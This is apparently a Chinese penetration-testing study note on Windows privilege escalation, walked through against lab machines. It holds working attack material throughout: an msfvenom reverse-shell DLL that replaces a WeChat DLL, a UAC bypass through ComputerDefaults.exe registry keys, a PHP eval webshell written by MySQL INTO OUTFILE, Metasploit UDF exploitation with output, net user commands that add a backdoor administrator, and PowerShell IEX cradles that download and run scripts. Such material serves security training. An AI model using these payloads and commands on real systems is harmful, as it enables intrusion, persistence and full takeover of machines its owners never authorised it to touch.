[TOC]



# ==Windows系统提权==

#### UDF：

爆破MySQL密码

连接 MySQL

写入 木马 

菜刀链接

使用 sys_eval 实现命令执行回显

创建 msf 所需目录

设置 UDF 的 meterpreter 参数

运行 UDF payload

运行 msf 上传dll文件

使用 mysql 创建用户

使用mysql为创建的用户提权

远程桌面登录

#### MOF：

爆破MySQL密码

连接 MySQL

设置 MOF 的 meterpreter 参数

运行 MOF payload



#### 一、 信息搜集

```
systeminfo | findstr OS         #获取系统版本信息
systeminfo | findstr /C:"Hotfix(s):" /C:"KB"         #获取已安装的补丁信息
wmic product get name,version         #获取已安装的软件和版本号
wmic nic where PhysicalAdapter=True get MACAddress,Name         #获取MAC地址和网卡名
wmic NICCONFIG WHERE IPEnabled=true GET IPAddress         #获取ip地址
hostname                 #获取主机名称
whoami /all             #获取当前用户的详细信息
whoami /priv             #显示当前用户的安全特权
net start                 #查看服务
quser or query user     #获取在线用户
netstat -ano | findstr 3389         #获取rdp连接来源IP
dir c:\programdata\                 #是否有安装杀毒软件，也可以通过tasklist得出结论
wmic qfe get Caption,Description,HotFixID,InstalledOn         #列出已安装的补丁
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber #获取远程端口
tasklist /svc | find "TermService"     #获取服务pid
netstat -ano | find "pid"             #获取远程端口
```

#### 二、服务路径空格提权

1、Windows系统服务命令

```
# 注册服务
sc create [service_name] binPath= "file_path" start= auto
sc query [service_name] # 查询服务
sc stop [service_name]  # 停止服务
sc config [service_name] binPath="[shell_path]" # 更改服务启动路径
sc start [service_name] # 启动服务
```

2、当系统管理员配置Windows服务时，必须指定要执行的命令，或者运行可执行文件的路径。当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果文件路径没有被双引号包裹的话，空格会截断文件路径，空格前的路径会被当做目标路径。

3、从服务中找到一个路径为：C:\Program Files\XXX路径且没有添加双引号的服务，然后将木马程序复制为：C:\Program 文件名，当重启该服务时，木马将会上线。

![image-20240108204436980](https://gitee.com/ymq_typroa/typroa/raw/main/202401082044022.png)

#### 三、注册键AlwaysInstallElevated

允许低权限用户以System权限安装文件。如果启用此策略设置项，那么任何权限的用户都以NT Authority\System权限来安装恶意的MSI文件。 windows install是windows操作系统的组件之一，专门用来管理配置软件服务

```
# 安装文件格式： msi

# gpedit.msc 打开组策略编辑器，在计算机配置/用户配置-管理模板-windows组件，找到windows installer，查看“始终以提升的权限进行安装”是否启用
# 可利用注册表修改
reg add HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1

# 通过powerup脚本查看
# https://github.com/HarmJ0y/PowerUp

PowerShell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.20/PowerUp.ps1'); Get-RegAlwaysInstallElevated
```

然后利用MSI Wrapper工具将MSF生成的exe木马转换为msi文件，让低权限用户在目标主机上运行该MSI文件即可实现提权：

https://blog.csdn.net/weixin_51151498/article/details/132309932

#### 四、本地DLL劫持提权

Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：

1. 应用程序加载的目录（**用户可控**）
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. 当前工作目录Current Working Directory，CWD
6. 在PATH环境变量的目录（先系统后用户）

这样的加载顺序很容易导致一个系统dll被劫持，因为只要攻击者将目标文件和恶意dll放在一起即可,导致恶意dll先于系统dll加载，而系统dll是非常常见的。

利用：

```
程序运行一般会加载系统dll或本身程序自带的dll，如果将程序执行时需要加载的dll文件替换成木马程序，那么下次在启动程序时所加载的dll就是我们替换的那个木马程序了。
```

**攻击过程：收集进程加载的dll -> 制作dll木马并上传 -> 替换dll -> 启动应用后成功**

> mmmojo_64.dll
>
> ![image-20230801164338754](https://gitee.com/ymq_typroa/typroa/raw/main/202401082023933.png)

利用MSF制作DLL木马：

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.112.216 LPORT=4444 -f dll -o mmmojo_64.dll
```

将生成的DLL文件替换微信安装目录下的同名文件（C:\Program Files (x86)\Tencent\WeChat[3.9.8.25]），再重启微信，确认MSF是否上线：

![image-20240108202900683](https://gitee.com/ymq_typroa/typroa/raw/main/202401082029739.png)

> 由于将微信的核心DLL文件进行了替换，所以将会导致微信无法正常启动，同时生成的DLL木马同样不免杀。所以即使是DLL文件，木马免杀同样也是比较重要的手段（见木马免杀的DLL劫持相关内容）。

#### 五、Bypass UAC

UAC(User Account Control，用户账号控制)是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证。

有**部分程序默认在UAC的白名单中**，打开这些程序获取到管理员权限时是不会弹UAC窗口。这些程序的`autoElevate`属性为True，启动的时候会静默提升为管理员权限。

可以利用这些步骤来绕过UAC：

1. 程序的.manifest后缀，的配置属性`autoElevate`值为True

2. 程序不弹UAC窗口

3. 程序会查询注册表中的`Shell\Open\command`键值对

   （通常以shell\open\command命名的键值对存储的是**可执行文件**的路径，如果exe程序运行的时候找到该键值对，**就会运行该键值对的程序**，而因为exe运行的时候是静默提升了权限，所以运行的该键值对的程序就已经过了uac。所以我们把恶意的exe路径写入该键值对，那么就能够过uac执行我们的恶意exe。）

利用步骤：

1. 这里我们找到 ComputerDefaults.exe（c:\windows\system32\ComputerDefaults.exe ） 这个程序

2. 使用procmon监听 ComputerDefaults.exe 的启动过程，发现其查询了HKCU\Software\Classes\ms-settings\Shell\Open\Command，结果显示没有找到

   ```
   # procomon添加过滤器
   Process Name is ComputerDefaults.exe
   Path contains Shell\Open\Command
   ```

   ![image-20230801102352109](https://gitee.com/ymq_typroa/typroa/raw/main/202308011023175.png)

   ![image-20230801102504871](https://gitee.com/ymq_typroa/typroa/raw/main/202308011025964.png)

3. 在注册表中新建对应的项

   `计算机\HKEY_CURRENT_USER\SOFTWARE\Classes\ms-settings\Shell\Open\command`

   ![image-20230801110333775](https://gitee.com/ymq_typroa/typroa/raw/main/202308011103834.png)

4. 再次打开 ComputerDefaults.exe ，发现这次它查询了 DelegateExecute 的值，并且结果显示没有找到。那么分析其先去查询HKCU\Software\Classes\ms-settings\Shell\Open\command路径下的注册表，再去查询HKCU\Software\Classes\ms-settings\Shell\Open\command\DelegateExecute是否存在

   ![image-20230801110516425](https://gitee.com/ymq_typroa/typroa/raw/main/202308011105509.png)

5. 新建 DelegateExecute 值，并把默认键值指向 cmd.exe，再次运行 ComputerDefaults.exe。弹出cmd窗口，运行 `start path`运行一个会弹出uac的程序 ，发现已经是绕过了uac

   ![image-20230801110942843](https://gitee.com/ymq_typroa/typroa/raw/main/202308011109926.png)

6. 将默认键指向 shell，再次运行 ComputerDefaults.exe，成功反弹shell到msf，成功绕过uac获得system权限

7. 通过添加注册表项直接实现：

   ```
   reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "C:\Users\admin\Downloads\windows.exe" /f
   reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /d "" /f
   ```

**额外扩展：可以使用工具 msf的uac模块实现提权，操作更加方便，参考：**

https://blog.csdn.net/weixin_51151498/article/details/132309932

#### 六、UDF和MOF提权环境准备

##### 1、准备虚拟机

![image-20220425104235866](https://gitee.com/ymq_typroa/typroa/raw/main/20220425104235.png)

![image-20220425104319577](https://gitee.com/ymq_typroa/typroa/raw/main/20220425104319.png)

![image-20220425104341284](https://gitee.com/ymq_typroa/typroa/raw/main/20220425104341.png)

![image-20220425104414057](https://gitee.com/ymq_typroa/typroa/raw/main/20220425104414.png)

> 在询问是否转换格式时，可以转换，也可以不转换。
>
> 如果Apache无法正常启动，在服务中将其修改为使用系统用户启动，或者重置apache用户密码。
>
> 如果MySQL访问很慢，则在my.ini中的mysqld节点下添加：skip-name-resolve

##### 2、扫描IP

```
nmap -sn 192.168.112.0/24   -> 192.168.112.194
```

##### 3、扫描操作系统

![image-20240928145407975](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928145407975.png)

从扫描结果可以看出，目标主机开放了80、445、3306和3389端口，也就意味着有很多漏洞可以利用，但是本次实验，我们只拿MySQL开刀，不去利用其他漏洞，完成MySQL提权后，创建一个新的账号用于登录3389远程桌面，如登录成功，则实验完成。

#### 七、UDF提权

##### 1、信息获取

UDF即：user defined function，即用户自定义函数。本提权仅适用于MySQL 5.5.9以下版本，超出该版本无法利用成功。所以我们在Windows 2003的靶机上进行演示，Linux上如果有对应版本也是可以的。

先通过爆破获取MySQL的账号，得到账密：root/qazwsx123，然后使用Navicat登录到MySQL，确认以下信息：

```
show variables like '%priv%'        # 确定Mysql的写文件的权限，拥有任意路径的写权限

show variables like '%plugin%'        # 确定Mysql的插件目录，并由此推断HTTP的主目录，                                       						C:\PHPnow\MySQL-5.1.50\lib/plugin
select * from mysql.func where name = "sys_exec";    # 确认系统中并不存在sys_exec的函数，需要使用UDF自行定义
```

##### 2、进入MSF进行漏洞利用

```
msf6 > use multi/mysql/mysql_udf_payload
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/mysql/mysql_udf_payload) > set username root
username => root
msf6 exploit(multi/mysql/mysql_udf_payload) > set password qazwsx123
password => qazwsx123
msf6 exploit(multi/mysql/mysql_udf_payload) > set rhosts 192.168.112.194
rhosts => 192.168.112.194
# 第一次运行报错，C:/PHPnow/MySQL-5.1.50/ 目录下没有 lib/plugin 目录
msf6 exploit(multi/mysql/mysql_udf_payload) > run

[*] Started reverse TCP handler on 192.168.112.148:4444 
[*] 192.168.112.194:3306 - Checking target architecture...
[*] 192.168.112.194:3306 - Checking for sys_exec()...
[*] 192.168.112.194:3306 - Checking target architecture...
[*] 192.168.112.194:3306 - Checking for MySQL plugin directory...
[*] 192.168.112.194:3306 - Target arch (win32) and target path both okay.
[*] 192.168.112.194:3306 - Uploading lib_mysqludf_sys_32.dll library to C:/PHPnow/MySQL-5.1.50/lib/plugin/gCQHoyUc.dll...
[-] 192.168.112.194:3306 - MySQL Error: RbMysql::ServerError Can't create/write to file 'C:\PHPnow\MySQL-5.1.50\lib\plugin\gCQHoyUc.dll' (Errcode: 2)
[-] 192.168.112.194:3306 - MySQL Error: RbMysql::ServerError::CantOpenLibrary Can't open shared library 'gCQHoyUc.dll' (errno: 2 )
[*] 192.168.112.194:3306 - Checking for sys_exec()...
[*] 192.168.112.194:3306 - MySQL function sys_exec() not available
[*] Exploit completed, but no session was created.
```

![image-20240928152650918](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928152650918.png)

发现报错，我们查看权限发现具有写权限，说明不是权限的问题，我们尝试使用 mysql 写入木马然后使用 菜刀 连接发现目标靶机并不存在  lib/plugin ，难怪写入失败

```
# 此时，利用SQL语句 select "<?php @eval($_POST['code']); ?>" into outfile "C:/PHPnow/htdocs/shell.php" 写入一句话木马，菜刀连接创建目录lib/plugin，再次run
```

PHPnow\MySQL-5.1.50 目录下目前只有这些文件和目录

![image-20240928153615952](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928153615952.png)

那么居然具有写权限，那么现在就给他创建 lib/plugin 目录，然后再运行

![image-20240928153550951](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928153550951.png)

```
msf6 exploit(multi/mysql/mysql_udf_payload) > run

[*] Started reverse TCP handler on 192.168.112.148:4444 
[*] 192.168.112.194:3306 - Checking target architecture...
[*] 192.168.112.194:3306 - Checking for sys_exec()...
[*] 192.168.112.194:3306 - Checking target architecture...
[*] 192.168.112.194:3306 - Checking for MySQL plugin directory...
[*] 192.168.112.194:3306 - Target arch (win32) and target path both okay.
[*] 192.168.112.194:3306 - Uploading lib_mysqludf_sys_32.dll library to C:/PHPnow/MySQL-5.1.50/lib/plugin/erXacnMA.dll...
[*] 192.168.112.194:3306 - Checking for sys_exec()...
[*] 192.168.112.194:3306 - Command Stager progress -  55.47% done (1444/2603 bytes)
[*] 192.168.112.194:3306 - Command Stager progress - 100.00% done (2603/2603 bytes)
[*] Exploit completed, but no session was created.
msf6 exploit(multi/mysql/mysql_udf_payload) >
```

![image-20240928154000652](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928154000652.png)

完成上述脚本后，回到Navicat中，可以在mysql数据库中的func表里面看到对应的函数定义，运行以下脚本创建用户自定义函数

> `lib_mysqludf_sys_64.dll` 这给就是我们要上传的动态链接库文件
>
> 后缀 so 代表linux的动态链接库文件
>
> 后缀 dll 则是 Windows 的
>
> ![image-20240928154425233](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928154425233.png)

![image-20240928155431371](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928155431371.png)

![image-20240928155636820](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928155636820.png)

在 MySQL 数据库的 func 表中可以看到创建的可执行的函数

然后执行自己想执行的任何函数

![image-20240928160317399](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928160317399.png)

![image-20240928160345428](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928160345428.png)

```
create function sys_eval returns string soname "erXacnMA.dll";
select sys_eval("ipconfig");
select sys_eval("whoami");        # 确认拥有管理员权限
如果能够执行成功，则利用MySQL的sys_eval函数创建新的用户和组，并完成远程3389登录。
select sys_eval("net user qiang 123456 /add");   #此时创建的用户 qiang 只是一个普通用户，无法用于远程桌面登录，所系需要给 qiang 进行提权
select sys_eval("net localgroup /add administrators qiang");
```

##### 3、登录远程桌面

利用在MySQL中创建的账户：qiang/123456，登录3389远程桌面。

![image-20211206170920547](https://gitee.com/ymq_typroa/typroa/raw/main/20211206170920.png)

##### 4、使用SQLMap的udf.dll实现手动处理

在SQLMap的目录中带了一个udf的dll文件，sqlmap\udf\mysql\windows，可以根据操作系统版本选择32位或64位的。该dll文件不能直接使用，需要利用SQLMap的cloak.py脚本先进行解码（路径在：sqlmap\extra\cloak目录下，使用Python2.X的版本运行：

```
c:\python27-x64\python.exe cloak.py -d -i lib_mysqludf_sys.dll -o lib_udf.dll
```

将生成的lib_udf.dll上传到MySQL的lib/plugin目录下（如果没有该目录，则手工创建），并执行以下SQL语句完成函数的创建：

```
CREATE function sys_eval returns string soname 'lib_udf.dll';
```

后续操作一致，直接利用SQL语句执行 select sys_eval(“命令”);

> 注意一个前提：UDF能够实现提权的前提是启动MySQL服务时使用的是管理员权限的账号。

#### 八、MOF提权

![image-20240928161413586](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928161413586.png)

![image-20240928161324843](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928161324843.png)

MOF指的是托管对象格式（Managed Object Format），是一种文件类型，它（nullevt.mof）在 C:\WINDOWS\system32\wbem\mof\ 路径下，将会每隔一段时间以System权限执行一次，我们可以通过root权限下的mysql将该文件写入到路径下，以达到提权的效果。提权条件：

（1）mysql允许远程连接； 

（2）secure_file_priv的值为空。

使用漏洞模块：exploit/windows/mysql/mysql_mof，从模块路径可以看出，该Payload仅针对Windows操作系统。

![image-20240928150609305](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928150609305.png)

> MOF提权需要依赖于Windows操作系统，在Windows2008之前的一些比较老的版本，所以在新版本上无效。
>
> 在Linux环境利用MySQL提权（非UDF提权）： https://www.modb.pro/db/104486

#### 九、提权辅助工具

1、windows-kernel-exploits：https://github.com/SecWiki/windows-kernel-exploits

![image-20240928150624357](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240928150624357.png)

2、PrivescCheck：https://github.com/itm4n/PrivescCheck

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format HTML"

# 除了HTML格式还可以选择TXT,CSV,,XML

powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.100.20/PrivescCheck.ps1'); Invoke-PrivescCheck Extended -Report PrivescCheck_%COMPUTERNAME% -Format HTML"
```

3、winPEASexe：https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/

```
meterpreter > execute -H -c "winPEASexe > result.txt"

# 将结果转化为json格式 
python3 peas2json.py result.txt peass.json
# 将json格式转化为htmlpython3 json2html.py peass.json peass.html
# 将json格式转化为pdf
python3 json2pdf.py peass.json peass.pdf
```

#### 十、内核提权或RCE

永恒之蓝入侵（MS17-010）：https://blog.csdn.net/Angelxiqi/article/details/119046341

烂土豆提权（MS16-075）：https://blog.csdn.net/qq_44159028/article/details/123429203

Windows 10 永恒之黑（CVE-2020-0796）:https://blog.csdn.net/PigLL/article/details/108012981

Windows域提权（MS14-068）：https://blog.csdn.net/weixin_43733912/article/details/108648223

